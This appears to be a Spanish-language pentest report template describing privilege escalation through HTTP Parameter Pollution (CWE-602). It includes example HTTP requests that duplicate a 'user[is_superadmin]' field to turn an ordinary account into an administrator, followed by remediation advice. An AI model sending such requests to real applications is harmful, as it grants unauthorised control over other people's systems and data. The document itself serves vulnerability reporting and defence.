# Privilege Escalation via Lack of Server-Side Validation (CWE-602) - {{Crítica | Alta}}

| Campo | Valor |
|---|---|
| **CVSS Vector** | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` |
| **CVSS Score** | `{{8.7}}` |
| **CWE** | [CWE-602 – Client-Side Enforcement of Server-Side Security](https://cwe.mitre.org/data/definitions/602.html) |
| **OWASP** | A01:2021 – Broken Access Control |
| **Estado** | {{Abierto}} |

## Descripción

Ocurre cuando un control de seguridad (validación de rol, permisos, límites de negocio)
se aplica únicamente en el cliente/frontend y el servidor confía en los valores enviados
sin revalidarlos. Un atacante que manipula la petición —incluyendo técnicas como **HTTP
Parameter Pollution**— puede forzar valores privilegiados que el backend acepta sin
verificación, escalando privilegios.

## Componentes Afectados

- `{{https://app.cliente.com/users/update}}`
- **Parámetros:** `{{user[is_superadmin]}}`, `{{role}}`

## Detalles

Se observó que el campo `{{is_superadmin}}` se valida solo en el frontend. Enviando el
parámetro duplicado (Parameter Pollution), el servidor procesa el segundo valor y otorga
privilegios elevados.

**Paso 1 — Petición original (sin privilegios)**

```http
POST /users/update HTTP/1.1
Host: app.cliente.com
Cookie: _session={{...}}
Content-Type: application/x-www-form-urlencoded

user[email]=usuario@cliente.com&user[is_superadmin]=0
```

**Paso 2 — Parameter Pollution para escalar privilegios**

```http
POST /users/update HTTP/1.1
Host: app.cliente.com
Cookie: _session={{...}}
Content-Type: application/x-www-form-urlencoded

user[email]=usuario@cliente.com&user[is_superadmin]=0&user[is_superadmin]=1
```

```http
HTTP/1.1 302 Found
Location: /dashboard
// el backend toma el segundo valor (1) → cuenta convertida en superadmin
```

> _Figura {{N}}: la cuenta queda con privilegios de administrador tras la manipulación._

## Impacto

Cualquier usuario autenticado puede convertirse en administrador de la plataforma,
obteniendo acceso a todas las funciones y datos, lo que representa un compromiso total
del control de acceso.

## Remediación

- Revalidar **siempre** en el servidor todo control de seguridad; nunca confiar en
  valores enviados por el cliente.
- Rechazar parámetros duplicados/inesperados y normalizar el parsing (defensa contra HPP).
- Aplicar listas blancas de campos modificables por el usuario (evitar mass assignment).
- Derivar privilegios desde la sesión del servidor, no desde el cuerpo de la petición.

## Referencias

- https://cwe.mitre.org/data/definitions/602.html
- https://owasp.org/www-community/attacks/HTTP_Parameter_Pollution
- https://owasp.org/Top10/A01_2021-Broken_Access_Control/
